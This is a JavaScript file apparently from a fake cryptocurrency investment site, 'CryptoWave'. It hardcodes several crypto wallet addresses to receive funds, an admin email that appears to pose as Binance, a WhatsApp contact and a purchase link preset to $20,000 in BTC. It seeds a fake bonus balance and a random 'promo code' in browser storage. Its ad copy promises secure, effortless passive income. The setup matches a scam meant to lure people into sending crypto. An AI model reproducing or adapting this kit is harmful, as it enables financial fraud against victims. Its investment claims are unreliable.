const bnb_wallet = "bnb1rrdwt5cv3qz0fazecjvhp9053atpfjwmlvppmv";
const btc_wallet = "3AcFaKN3N4dnuXRBtgu8K4LwY8oXynRaGQ";
const usdt_wallet = "0x201f0E3BF1B176Ef29FEA4ac655c2c9627AB9586";
const eth_wallet = "0x201f0E3BF1B176Ef29FEA4ac655c2c9627AB9586";
const doge_wallet = "DLWzV8G5QE6xSu2AKvJ6Eq2DHaRgdnCxxp";
const admin_email = "cryptocurrency@binance.com";
const whatsapp = 'https://wa.me/16163302531';
const buynow = "https://changenow.io/exchange?from=usd&to=btc&fiatMode=true&amount=20000";
// 

if (!localStorage.hasOwnProperty('bonus')) {
    let userBonus = {};
    userBonus.promo = promo_balance;
    localStorage.setItem('bonus', JSON.stringify(userBonus));
}

// 

function generateRandomString(length) {
    const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
    let randomString = '';

    for (let i = 0; i < length; i++) {
        const randomIndex = Math.floor(Math.random() * characters.length);
        randomString += characters.charAt(randomIndex);
    }
    return randomString;
};

// 

let randomString

if (localStorage.hasOwnProperty('promoCode')) {
    let promoCode = JSON.parse(localStorage.getItem("promoCode"));

    randomString = promoCode.code;

} else {
    randomString = generateRandomString(21); // Change 10 to the desired length
    let promo = {}
    promo.code = randomString;
    localStorage.setItem('promoCode', JSON.stringify(promo));
}

let promo_id = randomString;
// 

const writeUp1 = `

<h2>Introducing CryptoWave: Surf the Future of Finance!</h2>

<img src="pic/main_bg.avif">

<section>
<p>
Are you ready to ride the wave of the future? Dive into the exciting world of cryptocurrencies with CryptoWave – your ultimate destination for secure, seamless, and rewarding digital asset management.
</p>

<h4>Why Choose CryptoWave?</h4>

<ul>
<li>
<b>🔒 Security First:</b> <span>Your peace of mind is our top priority. With advanced encryption and cutting-edge security protocols, your assets are safeguarded against threats, ensuring a worry-free experience.</span>
</li>

<li>
<b>⚡ Lightning-Fast Transactions:</b> <span>Say goodbye to sluggish transfers! Enjoy lightning-fast transaction speeds on the CryptoWave platform, ensuring your funds are where you need them, when you need them.</span>
</li>

<li>
<b>💰 Earn While You HODL:</b> <span>Amplify your crypto holdings effortlessly. Our innovative staking and yield farming options let you earn lucrative rewards simply by holding your favorite cryptocurrencies.</span>
</li>

<li>
<b>🔄 User-Friendly Interface:</b> <span>Navigating the crypto world has never been easier. Our intuitive interface caters to both beginners and seasoned traders, making buying, selling, and swapping assets a breeze.</span>
</li>

<li>
<b>📈 Real-Time Insights:</b> <span>Stay ahead of the game with real-time market data, comprehensive charts, and expert insights. Make informed decisions and seize the most lucrative opportunities.</span>
</li>

<li>
<b>🌐 Global Accessibility:</b> <span>CryptoWave is your passport to the global economy. Trade and manage your assets anytime, anywhere – no borders, no boundaries.</span>
</li>
</ul>

<h3>Join the CryptoWave Revolution Today!</h3>

<p>
Embark on a journey of financial empowerment and unlock the door to boundless possibilities. Sign up now to receive an exclusive welcome bonus and be part of the CryptoWave revolution.</p>
<br/>
<i>Don't miss the wave – ride it with CryptoWave and surf your way to a prosperous future. Visit our website or download the app to get started today!</i>


</section>
`;

const writeUp2 = `
<h2>Introducing CryptoWave: Ride the Future of Finance!</h2>
<img src="pic/main_bg.jpg">
<section>
<p>
Are you ready to embark on a groundbreaking journey into the world of digital finance? Look no further than CryptoWave – your ultimate gateway to the future of money.
</p>

<ol>
<li>
<b>🌐 Discover Limitless Possibilities:</b> <span>Unlock unparalleled financial opportunities with our cutting-edge cryptocurrency platform. Whether you're an experienced trader or just dipping your toes into the world of crypto, CryptoWave provides you with the tools and resources you need to navigate the digital asset landscape with confidence.</span>
</li>

<li>
<b>💡 Empower Your Financial Freedom:</b> <span>Say goodbye to traditional constraints and embrace financial autonomy like never before. CryptoWave empowers you to take control of your wealth, allowing you to send, receive, and invest in cryptocurrencies seamlessly. Your financial future is in your hands.</span>
</li>

<li>
<b>🔒 Fortress-Like Security:</b> <span>Your security is our top priority. With state-of-the-art encryption and advanced security protocols, CryptoWave ensures your assets are stored safely. Trade with peace of mind, knowing that your investments are guarded by the latest in cybersecurity technology.</span>
</li>

<li>
<b>🔄 User-Friendly Interface:</b> <span>Navigating the crypto world shouldn't be complicated. Our user-friendly interface is designed to cater to both beginners and seasoned traders, making it easy to buy, sell, and manage your digital assets. No more confusion – just smooth sailing through the waves of crypto.</span>
</li>

<li>
<b>📈 Real-Time Insights:</b> <span>Stay ahead of the game with real-time market insights and trends at your fingertips. Make informed decisions based on accurate data, and seize opportunities as they arise. With CryptoWave, you'll always be steps ahead in the fast-paced world of crypto trading.</span>
<li>

<li>
<b>🌍 Global Community:</b> <span>Join a thriving community of crypto enthusiasts, investors, and experts from around the world. Share knowledge, learn from each other's experiences, and be part of a movement that's shaping the future of finance.</span>
</li>

<li>
<b>🎁 Exclusive Rewards:</b> <span>As a token of our appreciation for choosing CryptoWave, enjoy exclusive rewards and benefits that amplify your trading experience. From zero-fee trading options to special airdrops, our perks add an extra layer of excitement to your crypto journey.</span>
</li>

<li>
<b>🔗 Seamless Integration:</b> <span>Connect your traditional financial world with the future of finance. CryptoWave's platform allows for easy integration with your existing financial accounts, streamlining your transactions and investments like never before.</span>
</li>
</ol>
</section>
`;

const ad1 = `
<h4>Revolutionize Your Finance</h4>
<p>
<b>Are traditional financial systems leaving you frustrated?</b> It's time to embrace the future of money with CryptoCurrency! 
<br/>
Say goodbye to intermediaries and hello to decentralized, borderless transactions. Join the movement today and experience financial freedom like never before. 
<br/>
</p>
<i>Your journey to a new era of finance starts here!<i/>
`;
const ad2 = `
<h4>Discover the Power of Digital Gold</h4>
<p>
<b>Looking for an asset with incredible potential?</b> Look no further. Invest in CryptoCurrency, the digital gold of the 21st century. 
<br/>
With its limited supply and growing global adoption, now is the perfect time to diversify your portfolio and be a part of the next financial revolution. 
<br/>
</p>
<i>Don't miss out on this golden opportunity!</i>
`;
const ad3 = `
<h4>Earn While You Sleep</h4>
<p>
Imagine earning money while you sleep. With CryptoCurrency, it's not a dream – it's a reality. Stake your coins, provide liquidity, or participate in yield farming to earn passive income. 
<br>
Let your CryptoCurrency work for you and watch your wealth grow 24/7. 
<br/>
</p>
<i>Get started today and make your money work as hard as you do!</i>
`;
const ad4 = `
<h4>Innovation Meets Investment!</h4>
<p>
Innovation never stops, and neither does CryptoCurrency. Stay ahead of the curve by investing in the currency of the digital age. 
<br/>
With its groundbreaking technology and global potential, CryptoCurrency offers a world of opportunities for savvy investors. <br/>
</p>
<i>Seize the moment and be a pioneer in the future of finance.</i>
`;
const ad5 = `
<h4>The future of money is here</h4>
<p>
Cryptocurrency is the new way to pay for goods and services. It's fast, secure, and borderless. With cryptocurrency, you can send money to anyone in the world, instantly and without fees.
<br/>
</p>
<i>Sign up for a cryptocurrency wallet today and start using the future of money.</i>
`;
const ad6 = `
<h4>Invest in the future of finance</h4>
<p>
Cryptocurrency is the new asset class. It's a store of value that's not subject to government control. With cryptocurrency, you can protect your wealth from inflation and economic uncertainty.
<br/>
</p>
<i>Buy cryptocurrency today and start investing in the future.<i/>
`;